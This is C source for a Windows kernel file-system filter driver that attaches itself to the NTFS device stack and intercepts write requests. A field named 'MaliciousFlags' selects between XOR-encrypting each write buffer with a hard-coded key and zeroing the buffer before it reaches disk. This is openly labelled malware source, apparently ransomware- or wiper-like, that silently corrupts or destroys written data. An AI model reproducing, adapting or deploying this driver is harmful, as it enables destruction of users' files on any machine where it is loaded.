#include <ntifs.h>
#include "FileFilerDriver.h"

NTSTATUS EncryptReadBuffer(PUCHAR pBuffer, size_t length, const PUCHAR pkey) {
	size_t KeyLength = strlen((const char*)pkey);

	for (size_t i = 0; i < length; i++) {
		pBuffer[i] ^= pkey[i % KeyLength];
	}

	return STATUS_SUCCESS;
}

NTSTATUS WipeBuffer(PUCHAR pBuffer, size_t length) {
	if (pBuffer != 0) RtlZeroMemory(pBuffer, length);
	return STATUS_SUCCESS;
}

NTSTATUS AttachToFileSystemStack(PDRIVER_OBJECT pDriverObject) {
	PDEVICE_OBJECT pFileFilterDevice;

	//Initialize Device.
	NTSTATUS status = IoCreateDevice(pDriverObject, sizeof(DeviceExtension), NULL, FILE_DEVICE_DISK_FILE_SYSTEM, 0, TRUE, &pFileFilterDevice);
	if (!NT_SUCCESS(status)) return status;

	//Set flags.
	pFileFilterDevice->Flags |= FILE_DEVICE_SECURE_OPEN;
	pFileFilterDevice->Flags |= DO_DIRECT_IO;
	pFileFilterDevice->Flags &= ~DO_DEVICE_INITIALIZING;

	//Initialize DeviceExtension.
	RtlZeroMemory(pFileFilterDevice->DeviceExtension, sizeof(DeviceExtension));
	pDeviceExtension pFileFilterDeviceEx = (pDeviceExtension)pFileFilterDevice->DeviceExtension;
	pFileFilterDeviceEx->MaliciousFlags = FLAG_ENCRYPT;

	//Acquire pointer to a file-system's device.
	PDEVICE_OBJECT pTargetDevice;
	PFILE_OBJECT pFileObject;

	RtlInitUnicodeString(pFileFilterDeviceEx->TargetFile, L"\\FileSystem\\ntfs");
	status = IoGetDeviceObjectPointer(pFileFilterDeviceEx->TargetFile, FILE_READ_DATA, &pFileObject, &pTargetDevice);
	if (!NT_SUCCESS(status)) {
		IoDeleteDevice(pFileFilterDevice);
		return STATUS_UNSUCCESSFUL;
	}

	pFileFilterDeviceEx->pLowerDeviceObject = IoAttachDeviceToDeviceStack(pFileFilterDevice, pTargetDevice);
	if (pFileFilterDeviceEx->pLowerDeviceObject == NULL) {
		ObDereferenceObject(pFileObject);
		IoDeleteDevice(pFileFilterDevice);
		return STATUS_NO_SUCH_DEVICE;
	}

	ObDereferenceObject(pFileObject);
	return STATUS_SUCCESS;
}

NTSTATUS FilterWrite(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	pDeviceExtension pDeviceObjectEx = (pDeviceExtension)pDeviceObject->DeviceExtension;
	if (pIrp->MdlAddress == NULL) return DispatchPassDown(pDeviceObject, pIrp);
	
	PUCHAR pBuffer = (PUCHAR)MmGetSystemAddressForMdlSafe(pIrp->MdlAddress, NormalPagePriority);
	size_t length = MmGetMdlByteCount(pIrp->MdlAddress);
	PUCHAR key = (PUCHAR)"AliAbbasHaider";

	if (pBuffer == NULL) return DispatchPassDown(pDeviceObject, pIrp);

	switch (pDeviceObjectEx->MaliciousFlags) {
	case FLAG_ENCRYPT:
		EncryptReadBuffer(pBuffer, length, key);
		break;

	case FLAG_WIPE:
		WipeBuffer(pBuffer, length);
		break;
	}

	return DispatchPassDown(pDeviceObject, pIrp);
}

NTSTATUS DispatchPassDown(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
	pDeviceExtension pDeviceObjectEx = (pDeviceExtension)pDeviceObject->DeviceExtension;
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(pDeviceObjectEx->pLowerDeviceObject, pIrp);
}
